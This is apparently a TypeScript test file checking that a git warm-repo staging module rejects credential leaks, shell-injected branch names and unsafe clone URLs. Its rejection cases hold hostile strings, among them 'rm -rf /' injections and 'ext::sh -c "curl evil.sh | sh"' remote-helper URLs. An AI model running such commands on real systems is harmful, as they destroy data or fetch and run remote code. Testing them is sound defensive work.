import { afterEach, describe, expect, test } from 'bun:test';
import { execFile } from 'node:child_process';
import { mkdtemp, mkdir, rm, writeFile, readFile, readdir, stat } from 'node:fs/promises';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { promisify } from 'node:util';

function setTestEnv(name: string, value: string): void {
  if (!process.env[name] || process.env[name]?.startsWith('encrypted:')) {
    process.env[name] = value;
  }
}

// This CI/dev host's default TMPDIR is root-owned + unwritable; /tmp is writable.
// Point the temp base at a writable dir so the real git clone can stage a repo.
if (!process.env.TMPDIR || process.env.TMPDIR.startsWith('/var/folders/')) {
  process.env.TMPDIR = '/tmp';
}

setTestEnv('DATABASE_URL', 'postgres://postgres:postgres@127.0.0.1:54322/postgres');
setTestEnv('SUPABASE_URL', 'http://127.0.0.1:54321');
setTestEnv('SUPABASE_SERVICE_ROLE_KEY', 'test-service-role');
setTestEnv('API_KEY_SECRET', 'test-api-key-secret');
setTestEnv('TUNNEL_SIGNING_SECRET', 'test-tunnel-signing-secret');
setTestEnv('ALLOWED_SANDBOX_PROVIDERS', 'platinum');
setTestEnv('KORTIX_URL', 'https://api.example.test');
setTestEnv('FRONTEND_URL', 'http://localhost:3000');
setTestEnv('INTERNAL_KORTIX_ENV', 'dev');
setTestEnv('RECALL_BASE_URL', 'https://us-west-2.recall.ai/api/v1');

const {
  stageWarmRepoCheckout,
  assertCheckoutHasNoCredentials,
  assertSafeCloneUrl,
  warmCloneProtocolPinArgs,
  isSafeGitBranchName,
  isSafeGitSha,
  WARM_REPO_STAGED_DIR,
  WARM_REPO_STAGED_GIT_DIR,
} = await import('./build-context');

const exec = promisify(execFile);

// A distinctive marker that must NEVER appear in any staged build-context byte.
// Deliberately NOT shaped like a real provider token so secret scanners don't
// false-positive on it — the test only needs a unique string to grep for.
const SENTINEL = 'kortix-warmrepo-cred-sentinel-not-a-real-token-DO-NOT-SHIP';
const PROXY_ORIGIN = 'https://proxy.kortix.test/git/proj-1234.git';

const cleanup: string[] = [];
afterEach(async () => {
  for (const p of cleanup.splice(0)) await rm(p, { recursive: true, force: true }).catch(() => {});
});

/** A real local git repo with a `main` branch and one commit — fetched via file://
 *  so the test needs no network and exercises the actual git fetch/pin path.
 *  Returns the dir + the resolved HEAD sha the warm bake pins to. */
async function makeSourceRepo(): Promise<{ dir: string; sha: string }> {
  const dir = await mkdtemp(join(tmpdir(), 'warm-src-'));
  cleanup.push(dir);
  const env = {
    ...process.env,
    GIT_AUTHOR_NAME: 'T', GIT_AUTHOR_EMAIL: 't@t.test',
    GIT_COMMITTER_NAME: 'T', GIT_COMMITTER_EMAIL: 't@t.test',
  };
  const g = (args: string[]) => exec('git', args, { cwd: dir, env });
  await g(['init', '-b', 'main']);
  await g(['config', 'user.email', 't@t.test']);
  await g(['config', 'user.name', 'T']);
  // Mirror a production git host (GitHub) that serves fetch-by-sha, so the
  // primary pin path (`git fetch --depth 1 <url> <sha>`) resolves an exact commit
  // — including an ancestor after the branch advances.
  await g(['config', 'uploadpack.allowReachableSHA1InWant', 'true']);
  await g(['config', 'uploadpack.allowAnySHA1InWant', 'true']);
  await writeFile(join(dir, 'README.md'), '# hello\n');
  await g(['add', '-A']);
  await g(['commit', '-m', 'init']);
  const { stdout } = await g(['rev-parse', 'HEAD']);
  return { dir, sha: stdout.trim() };
}

/** A hex string that is a valid-shaped sha but not the tip — used by guard tests
 *  that must reject BEFORE the fetch (branch/cloneUrl checks fire first). */
const DUMMY_SHA = '0'.repeat(40);

async function collectBytes(dir: string): Promise<string> {
  let out = '';
  for (const entry of await readdir(dir, { withFileTypes: true, recursive: true })) {
    const full = join((entry as any).parentPath ?? (entry as any).path ?? dir, entry.name);
    if (!(await stat(full).catch(() => null))?.isFile()) continue;
    out += await readFile(full, 'latin1').catch(() => '');
  }
  return out;
}

describe('PHASE 1: warm-repo checkout is staged credential-free', () => {
  test('the sentinel git credential never lands in the staged checkout', async () => {
    const src = await makeSourceRepo();
    const ctx = await mkdtemp(join(tmpdir(), 'warm-ctx-'));
    cleanup.push(ctx);

    const { stagedPath, stagedGitPath, headSha } = await stageWarmRepoCheckout(ctx, {
      cloneUrl: `file://${src.dir}`,
      cloneHeaders: { Authorization: `Bearer ${SENTINEL}` },
      branch: 'main',
      tip: src.sha,
      originUrl: PROXY_ORIGIN,
    });

    expect(stagedPath).toBe(WARM_REPO_STAGED_DIR);
    expect(stagedGitPath).toBe(WARM_REPO_STAGED_GIT_DIR);
    expect(headSha).toBe(src.sha);
    expect(headSha).toMatch(/^[0-9a-f]{40}$/);

    const dest = join(ctx, stagedPath);
    // The checkout is a real repo at the requested tip.
    const gitDir = await stat(join(dest, '.git'));
    expect(gitDir.isDirectory()).toBe(true);
    const visibleGitDir = await stat(join(ctx, stagedGitPath));
    expect(visibleGitDir.isDirectory()).toBe(true);
    const { stdout: visibleHead } = await exec('git', [
      `--git-dir=${join(ctx, stagedGitPath)}`,
      `--work-tree=${dest}`,
      'rev-parse',
      'HEAD',
    ]);
    expect(visibleHead.trim()).toBe(headSha);
    const { stdout: head } = await exec('git', ['-C', dest, 'rev-parse', 'HEAD']);
    expect(head.trim()).toBe(headSha);

    // origin was reset to the runtime proxy — the build credential is not
    // persisted for runtime use.
    const { stdout: origin } = await exec('git', ['-C', dest, 'remote', 'get-url', 'origin']);
    expect(origin.trim()).toBe(PROXY_ORIGIN);

    // THE proof: the sentinel token appears NOWHERE in the staged bytes
    // (Dockerfile-less checkout, .git/config, packed refs, logs — everything).
    const allBytes = await collectBytes(dest);
    expect(allBytes).not.toContain(SENTINEL);
    expect(allBytes.toLowerCase()).not.toContain('authorization');
    expect(allBytes.toLowerCase()).not.toContain('extraheader');

    // .git/config specifically carries no auth material.
    const config = await readFile(join(dest, '.git', 'config'), 'utf8');
    expect(config).not.toContain(SENTINEL);
    expect(config.toLowerCase()).not.toContain('authorization');
    expect(config.toLowerCase()).not.toContain('extraheader');
  }, 30_000);

  test('a tar of the staged context does not contain the sentinel', async () => {
    const src = await makeSourceRepo();
    const ctx = await mkdtemp(join(tmpdir(), 'warm-ctx-'));
    cleanup.push(ctx);
    await stageWarmRepoCheckout(ctx, {
      cloneUrl: `file://${src.dir}`,
      cloneHeaders: { Authorization: `Bearer ${SENTINEL}`, 'X-Extra': SENTINEL },
      branch: 'main',
      tip: src.sha,
      originUrl: PROXY_ORIGIN,
    });
    const tarPath = join(ctx, '..', `warm-ctx-${crypto.randomUUID()}.tar`);
    cleanup.push(tarPath);
    await exec('tar', ['-cf', tarPath, '-C', ctx, '.']);
    const tarBytes = await readFile(tarPath, 'latin1');
    expect(tarBytes).not.toContain(SENTINEL);
  }, 30_000);
});

describe('PHASE 1: default branch name is validated (no shell injection)', () => {
  test.each([
    'main',
    'release/1.2.3',
    'feature/foo-bar',
    'v1.0.0',
    'a_b.c-d/e',
  ])('accepts safe branch %p', (b) => {
    expect(isSafeGitBranchName(b)).toBe(true);
  });

  test.each([
    'main"; rm -rf / #',
    'main; echo pwned',
    '$(curl evil.sh)',
    '`whoami`',
    'a b',
    '-x',
    '/leading',
    'trailing/',
    'a..b',
    'a//b',
    '',
  ])('rejects unsafe branch %p', (b) => {
    expect(isSafeGitBranchName(b)).toBe(false);
  });

  test('stageWarmRepoCheckout refuses an unsafe branch before cloning', async () => {
    const ctx = await mkdtemp(join(tmpdir(), 'warm-ctx-'));
    cleanup.push(ctx);
    await expect(
      stageWarmRepoCheckout(ctx, {
        cloneUrl: 'file:///nonexistent',
        cloneHeaders: {},
        branch: 'main"; echo pwned',
        tip: DUMMY_SHA,
        originUrl: PROXY_ORIGIN,
      }),
    ).rejects.toThrow(/unsafe default branch/);
  });
});

describe('PHASE 1: assertCheckoutHasNoCredentials fails closed', () => {
  async function writeGitConfig(body: string): Promise<string> {
    const dir = await mkdtemp(join(tmpdir(), 'cfg-'));
    cleanup.push(dir);
    await mkdir(join(dir, '.git'), { recursive: true });
    await writeFile(join(dir, '.git', 'config'), body);
    return dir;
  }

  test('rejects a persisted http.extraHeader', async () => {
    const dir = await writeGitConfig(
      '[http]\n\textraHeader = Authorization: Bearer ' + SENTINEL + '\n',
    );
    await expect(assertCheckoutHasNoCredentials(dir)).rejects.toThrow(/credential material/);
  });

  test('rejects an embedded userinfo in a remote url', async () => {
    const dir = await writeGitConfig(
      '[remote "origin"]\n\turl = https://user:' + SENTINEL + '@github.com/a/b.git\n',
    );
    await expect(assertCheckoutHasNoCredentials(dir)).rejects.toThrow(/credential material/);
  });

  test('rejects a persisted credential.helper', async () => {
    const dir = await writeGitConfig('[credential]\n\thelper = store\n');
    await expect(assertCheckoutHasNoCredentials(dir)).rejects.toThrow(/credential material/);
  });

  test('accepts a clean proxy-origin config', async () => {
    const dir = await writeGitConfig(
      '[remote "origin"]\n\turl = ' + PROXY_ORIGIN + '\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n',
    );
    await expect(assertCheckoutHasNoCredentials(dir)).resolves.toBeUndefined();
  });

  test('a genuinely-absent .git/config (ENOENT) is a pass', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'noconfig-'));
    cleanup.push(dir);
    await mkdir(join(dir, '.git'), { recursive: true }); // .git exists, config does not
    await expect(assertCheckoutHasNoCredentials(dir)).resolves.toBeUndefined();
  });

  test('a non-ENOENT read error fails CLOSED (build fails, credential not assumed absent)', async () => {
    // .git/config is a DIRECTORY → readFile throws EISDIR (not ENOENT). The old
    // `catch { return }` swallowed this and passed; the fix must rethrow so an
    // unreadable config can never silently ship an unverified checkout.
    const dir = await mkdtemp(join(tmpdir(), 'eisdir-'));
    cleanup.push(dir);
    await mkdir(join(dir, '.git', 'config'), { recursive: true });
    await expect(assertCheckoutHasNoCredentials(dir)).rejects.toThrow();
    await expect(assertCheckoutHasNoCredentials(dir)).rejects.not.toThrow(/credential material/);
  });
});

describe('PHASE 1: warm cloneUrl transport is pinned (no remote-helper RCE / secret leak)', () => {
  test.each([
    ['ext:: remote helper', 'ext::sh -c "curl evil.sh | sh"'],
    ['file:: remote helper', 'file::/etc/passwd'],
    ['fd:: remote helper', 'fd::7'],
    ['plain http', 'http://github.com/a/b.git'],
    ['ssh scheme', 'ssh://git@github.com/a/b.git'],
    ['git scheme', 'git://github.com/a/b.git'],
  ])('rejects a non-https cloneUrl: %s', (_label, url) => {
    expect(() => assertSafeCloneUrl(url)).toThrow(/must use https|not a valid absolute URL/);
  });

  test('rejects an https cloneUrl that embeds userinfo (FETCH_HEAD leak path)', () => {
    expect(() => assertSafeCloneUrl(`https://user:${SENTINEL}@github.com/a/b.git`)).toThrow(/userinfo/);
  });

  test('accepts a clean https cloneUrl', () => {
    expect(() => assertSafeCloneUrl('https://github.com/kortix-ai/suna.git')).not.toThrow();
  });

  test('the credential-free rejection message never contains the token', () => {
    try {
      assertSafeCloneUrl(`https://user:${SENTINEL}@github.com/a/b.git`);
      throw new Error('should have thrown');
    } catch (err) {
      expect((err as Error).message).not.toContain(SENTINEL);
    }
  });

  test('the protocol pin is present in the clone invocation', () => {
    expect(warmCloneProtocolPinArgs('https://github.com/a/b.git')).toEqual([
      '-c',
      'protocol.allow=never',
      '-c',
      'protocol.https.allow=always',
    ]);
  });

  test('stageWarmRepoCheckout rejects a remote-helper cloneUrl before any git runs', async () => {
    const ctx = await mkdtemp(join(tmpdir(), 'warm-ctx-'));
    cleanup.push(ctx);
    await expect(
      stageWarmRepoCheckout(ctx, {
        cloneUrl: 'ext::sh -c "id"',
        cloneHeaders: {},
        branch: 'main',
        tip: DUMMY_SHA,
        originUrl: PROXY_ORIGIN,
      }),
    ).rejects.toThrow(/must use https/);
  });
});

describe('FIX-G: the warm checkout is pinned to the EXACT cache-key sha', () => {
  test('the staged checkout HEAD equals the requested tip', async () => {
    const src = await makeSourceRepo();
    const ctx = await mkdtemp(join(tmpdir(), 'warm-ctx-'));
    cleanup.push(ctx);
    const { headSha } = await stageWarmRepoCheckout(ctx, {
      cloneUrl: `file://${src.dir}`,
      cloneHeaders: {},
      branch: 'main',
      tip: src.sha,
      originUrl: PROXY_ORIGIN,
    });
    expect(headSha).toBe(src.sha);
    const { stdout: head } = await exec('git', ['-C', join(ctx, WARM_REPO_STAGED_DIR), 'rev-parse', 'HEAD']);
    expect(head.trim()).toBe(src.sha);
  }, 30_000);

  test('a branch that advanced AFTER tip-resolution still yields SHA-X content under the SHA-X key', async () => {
    const src = await makeSourceRepo();
    const env = {
      ...process.env,
      GIT_AUTHOR_NAME: 'T', GIT_AUTHOR_EMAIL: 't@t.test',
      GIT_COMMITTER_NAME: 'T', GIT_COMMITTER_EMAIL: 't@t.test',
    };
    const g = (args: string[]) => exec('git', args, { cwd: src.dir, env });
    // src.sha is SHA-X (README == "# hello"). Now advance `main` to SHA-Y with
    // DIFFERENT content — exactly the race the old branch-clone lost.
    await writeFile(join(src.dir, 'README.md'), '# ADVANCED TIP CONTENT\n');
    await g(['commit', '-am', 'advance the tip']);
    const { stdout: newTip } = await g(['rev-parse', 'HEAD']);
    expect(newTip.trim()).not.toBe(src.sha);

    const ctx = await mkdtemp(join(tmpdir(), 'warm-ctx-'));
    cleanup.push(ctx);
    // Bake pinned to SHA-X (the cache key) even though the branch tip is now SHA-Y.
    const { headSha } = await stageWarmRepoCheckout(ctx, {
      cloneUrl: `file://${src.dir}`,
      cloneHeaders: {},
      branch: 'main',
      tip: src.sha,
      originUrl: PROXY_ORIGIN,
    });
    expect(headSha).toBe(src.sha);
    // The decisive assertion: the staged /workspace carries SHA-X content, NOT the
    // advanced tip's content — the image named for SHA-X can never carry SHA-Y bytes.
    const readme = await readFile(join(ctx, WARM_REPO_STAGED_DIR, 'README.md'), 'utf8');
    expect(readme).toBe('# hello\n');
    expect(readme).not.toContain('ADVANCED TIP CONTENT');
  }, 30_000);

  test('a tip that no longer exists FAILS the bake (never silently ships other content)', async () => {
    const src = await makeSourceRepo();
    const ctx = await mkdtemp(join(tmpdir(), 'warm-ctx-'));
    cleanup.push(ctx);
    // A well-formed sha that was never in this repo (force-pushed away). Primary
    // fetch-by-sha misses it; the branch fallback fetch cannot check it out → FAIL.
    const goneSha = 'deadbeef'.repeat(5);
    expect(isSafeGitSha(goneSha)).toBe(true);
    await expect(
      stageWarmRepoCheckout(ctx, {
        cloneUrl: `file://${src.dir}`,
        cloneHeaders: {},
        branch: 'main',
        tip: goneSha,
        originUrl: PROXY_ORIGIN,
      }),
    ).rejects.toThrow(/not present on branch|does not match the pinned tip/);
  }, 30_000);

  test('the fallback path (host rejects fetch-by-sha) still yields the exact tip', async () => {
    const src = await makeSourceRepo();
    // Force the host to REJECT fetch-by-sha so the shallow-branch fallback runs.
    const env = { ...process.env };
    const cfg = (args: string[]) => exec('git', ['-C', src.dir, 'config', ...args], { env });
    await cfg(['uploadpack.allowReachableSHA1InWant', 'false']);
    await cfg(['uploadpack.allowAnySHA1InWant', 'false']);
    await cfg(['uploadpack.allowTipSHA1InWant', 'false']);

    const ctx = await mkdtemp(join(tmpdir(), 'warm-ctx-'));
    cleanup.push(ctx);
    const { headSha } = await stageWarmRepoCheckout(ctx, {
      cloneUrl: `file://${src.dir}`,
      cloneHeaders: {},
      branch: 'main',
      tip: src.sha, // still the branch tip → present in the depth-1 branch fetch
      originUrl: PROXY_ORIGIN,
    });
    expect(headSha).toBe(src.sha);
  }, 30_000);

  test('rejects a malformed (non-sha) tip before any git runs', async () => {
    const ctx = await mkdtemp(join(tmpdir(), 'warm-ctx-'));
    cleanup.push(ctx);
    await expect(
      stageWarmRepoCheckout(ctx, {
        cloneUrl: 'file:///nonexistent',
        cloneHeaders: {},
        branch: 'main',
        tip: 'not-a-sha',
        originUrl: PROXY_ORIGIN,
      }),
    ).rejects.toThrow(/not a full commit sha/);
  });

  test.each([
    ['a full lowercase sha', '0123456789abcdef0123456789abcdef01234567', true],
    ['the all-zero sha shape', '0'.repeat(40), true],
    ['too short', 'abc123', false],
    ['uppercase hex', 'A'.repeat(40), false],
    ['a branch name', 'main', false],
    ['sha with a space', '0'.repeat(39) + ' ', false],
    ['empty', '', false],
  ])('isSafeGitSha(%s)', (_label, value, expected) => {
    expect(isSafeGitSha(value)).toBe(expected);
  });
});
